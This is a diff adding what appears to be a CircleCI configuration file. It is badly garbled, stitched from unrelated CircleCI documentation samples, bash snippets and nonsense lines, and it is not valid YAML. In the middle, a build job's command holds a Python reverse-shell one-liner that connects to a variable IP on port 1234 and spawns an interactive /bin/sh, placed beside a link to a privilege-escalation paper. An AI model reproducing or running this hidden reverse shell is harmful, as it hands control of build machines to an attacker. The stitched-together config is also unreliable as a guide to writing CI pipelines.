@@ -1,0 +1,223 @@
+# Note that the following stanza uses CircleCI 2.1 to make use of a Reusable Executor
+# This allows defining a docker image to reuse across jobs.
+# visit https://circleci.com/docs/2.0/reusing-config/#authoring-reusable-executors to learn more.
+
+
+version: 2.1
+jobs:
+  Hello-World:
+    docker:
+      - image: alpine:3.7
+    steps:
+      - run:
+          name: Hello World
+          command: |
+            echo 'Hello World!'
+            echo 'This is the delivery pipeline'
+  I-Have-Code:
+    docker:
+      - image: alpine:3.7
+    steps:
+      - checkout
+      - run:
+          name: Code Has Arrived
+          command: |
+            ls -al
+            echo '^^^That should look familiar^^^'
+  Run-With-Node:
+    docker:
+      - image: circleci/node:10-browsers
+    steps:
+      - run:
+          name: Running In A Container With Node
+          command: |
+            node -v
+  Now-Complete:
+    docker:
+      - image: alpine:3.7
+    steps:
+      - run:
+          name: Approval Complete
+          command: |
+            echo 'Do work once the approval has completed'
+
+workflows:
+ version: 2
+ Example_Workflow:
+ while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
+  -V | --version )
+    echo $version
+    exit
+    ;;
+  -s | --string )
+    shift; string=$1
+    ;;
+  -f | --flag )
+    flag=1
+    ;;
+esac; shift; done
+if [[ "$1" == '--' ]]; then shift; fi
+   jobs:
+     - Hello-World
+     - I-Have-Code:
+         requires:
+           - Hello-World
+     - Run-With-Node:
+         requires:
+           - Hello-World
+     - Hold-For-Approval: traperr() {
+  echo "ERROR: ${BASH_SOURCE[1]} at about ${BASH_LINENO[0]}"
+}
+
+set -o errtrace
+trap traperr ERR
+         type: approval
+         requires:
+           - Run-With-Node
+           - I-Have-Code
+     - Now-Complete:
+         requires:
+           - Hold-For-Approval
+           - ~/.circleci/config.yml
+version: 2
+jobs:
+  test:
+    docker:
+      - image: circleci/<language>:<version TAG>
+    parallelism: 4
+    steps:
+      - run:
+          command: |
+            echo $(circleci tests glob "foo/**/*" "bar/**/*")
+            circleci tests glob "foo/**/*" "bar/**/*" | xargs -n 1 echo
+--timings-type flag.
+cat my_java_test_classnames | circleci tests split --split-by=timings --timings-type=classname
+circleci tests glob "test/**/*.java" | circleci tests split
+version: 2.1
+  jobs:
+   build:
+    machine:
+      image: ubuntu-1604:201903-0. 
+      # recommended linux image - includes Ubuntu 16.04, docker 18.09.3,   docker-compose 1.23.1
+  resource_class: 2xlarge
+    steps:
+      ... // other config
+     build:
+      executor: win/2xlarge
+    steps:
+      - run: Write-Host 'Hello, World'
+    build: 
+      run:
+        command: ./ci/$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+     working_directory: ~/.sh-python
+      environment: https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562
+       FOO: bar
+version: 2.1
+
+executors:
+  my-executor:
+    docker:
+      - image: buildpack-deps:jessie
+    working_directory: /tmp
+
+jobs:
+  flow:
+    executor: my-executor
+    steps:
+      - run: mkdir -p workspace
+      - run: echo "Hello, world!" > workspace/echo-output
+      
+      # Persist the specified paths (workspace/echo-output) into the workspace for use in downstream job. 
+      - persist_to_workspace:
+          # Must be an absolute path, or relative path from working_directory. This is a directory on the container which is 
+          # taken to be the root directory of the workspace.
+          root: workspace
+          # Must be relative path from root
+          paths:
+            - echo-output
+
+  downstream:
+    executor: my-executor
+    steps:
+      - attach_workspace:
+          # Must be absolute path or relative path from working_directory
+          at: /tmp/workspace
+
+      - run: |
+          if [[ `cat /tmp/workspace/echo-output` == "Hello, world!" ]]; then
+            echo "It worked!";
+          else
+            echo "Nope!"; test echo "deploy:gradle"-gradlew-set deployment SUB ^Z, if previous "github.com/user-builds=successful echo "it works!"
+          else
+            echo "Nope! "; exit "1"-with completed:"tasks"
+
+workflows:
+  version: 2
+
+  btd:
+    jobs:
+      - flow
+      - downstream:
+          requires:
+            - flow
+steps:
+  - run:
+     name: Running tests
+       command: make test  
+    - run:
+        command: |
+           echo Running test
+      mkdir -p /tmp/test-results
+  make test:
+    steps:
+      - run:
+          name: Testing application
+            command: make test
+               shell: /bin/bash
+      working_directory: ~/my-app
+      no_output_timeout: 30m
+        environment:
+          FOO: bar
+      - run: echo 127.0.0.1 devhost | sudo tee-a /etc/hosts -  
+      - run: |  sudo -u root createuser -h      localhost--superuser ubuntu && sudo createdb -h localhost test_db
+      - run:
+          name: Upload Failed Tests
+            command: curl --data fail_tests.log
+              http://example.com/error_logs
+                when: on_fail jobs: # conditional
+steps may also be. defined in  commands:`job_with_optional_custom_checkout:
+   parameters:
+     custom_checkout:
+       type: string
+          default: ""
+             machine: true
+               steps:
+                  - when:
+                  - condition: <<parameters.custom_checkout>>
+                steps:
+                  - run: echo "my custom checkout"
+                  - unless:
+                     condition:
+<<parameters.custom_checkout>>
+                 steps:
+                  - checkout
+                       workflows:
+                          build-test-deploy:
+                  jobs:               -job_with_optional_custom_checkout:
+custom_checkout: "any non-empty
+          string is truthy"                    -job_with_optional_custom_checkout
+                    - checkout
+                    - run: git submodule sync
+                    - run: git submodule update --init - 
+                    - run:}} 
+                    - name: Build the Jekyll site
+                       command: bundle exec jekyll build --source jekyll --destination jekyll/_site/docs/
+                    - store_artifacts:
+                        path: jekyll/_site/docs/
+                           destination: circleci-docs
+                    - myapp-{{ .Branch }}-{{ checksum "package-lock.json" 
+
+
+
+
+
